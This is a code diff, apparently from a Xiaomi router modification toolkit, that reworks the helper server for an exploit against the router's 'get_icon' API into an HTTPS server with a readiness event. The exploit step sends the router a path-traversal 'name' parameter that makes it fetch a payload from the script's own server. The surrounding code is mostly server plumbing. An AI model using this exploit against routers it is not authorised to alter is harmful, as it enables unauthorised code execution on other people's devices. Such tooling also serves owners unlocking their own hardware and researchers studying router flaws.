@@ -36,25 +36,44 @@ if api_get_icon_status <= 0:
     raise ExploitNotWorked('Exploit "get_icon" not working!!! (api not founded)')
 
 
+import threading
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from http.server import BaseHTTPRequestHandler
 from http import HTTPStatus
 from http import server as http_server
+
+srvInitEvent = threading.Event()
 
 class XmirHttpServer(HTTPServer):
     timeout = 3
     retcode = 0
     
     def server_bind(self):
-        HTTPServer.server_bind(self)
+        import ssl
+        root_dir = os.path.dirname(os.path.abspath(__file__))
+        certfile = f'{root_dir}\\data\\https\\cert.crt'
+        keyfile  = f'{root_dir}\\data\\https\\cert.key'
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_OPTIONAL
+        ctx.load_cert_chain(certfile = certfile, keyfile = keyfile)
+        self.socket = ctx.wrap_socket(self.socket, server_side = True)
+        super().server_bind()
+        
+    def server_activate(self):
+        global srvInitEvent
+        super().server_activate()
         print(f'SERVER: start and wait request from client...')
+        srvInitEvent.set()
         
     def handle_timeout(self):
         print(f"SERVER: Timed out! (timeout = {self.timeout})")
         self.retcode = -1
         
     def __del__(self):
+        global srvInitEvent
         print(f'SERVER: destroy with retcode = {self.retcode}')
+        srvInitEvent.clear()
 
 class HttpHandler(BaseHTTPRequestHandler):
     protocol_version = 'HTTP/1.1'
@@ -84,7 +103,7 @@ def wait_req_and_send_resp(path, data, bind_addr = '0.0.0.0', ret_code = None, t
     srv = XmirHttpServer((bind_addr, srv_port), HttpHandler)
     srv.action_path = path
     srv.resp_body = data.encode('utf-8') if isinstance(data, str) else data
-    srv.timeout = 5 + timeout
+    srv.timeout = timeout
     srv.handle_request()
     if isinstance(ret_code, list):
         ret_code[0] = srv.retcode
@@ -145,12 +164,16 @@ def install_exploit(api = 'API/xqsystem/get_icon'):
     # exploit public: https://archive.md/1PWkM
     # discovery date: 2024-12-30
     #######
-    global gw, srv_ip_addr, srv_port
+    global gw, srv_ip_addr, srv_port, srvInitEvent
     from threading import Thread
     srv_timeout = 3
     ret_code = [ None ]    
+    srvInitEvent.clear()
     server = Thread(target = wait_req_and_send_resp, args = [ payload_name, payload_body, srv_ip_addr, ret_code, srv_timeout ])
     server.start()
+    event_set = srvInitEvent.wait(timeout = 15)
+    if not event_set:
+        raise RuntimeError(f'Cannot initialize custom HTTPS server on TCP port {srv_port}')
     params = { 'ip': f'{srv_ip_addr}:{srv_port}', 'name': f'/../..{payload_name} dummy' }
     resp = gw.api_request(api, params, stream = True, timeout = 12)
     try:
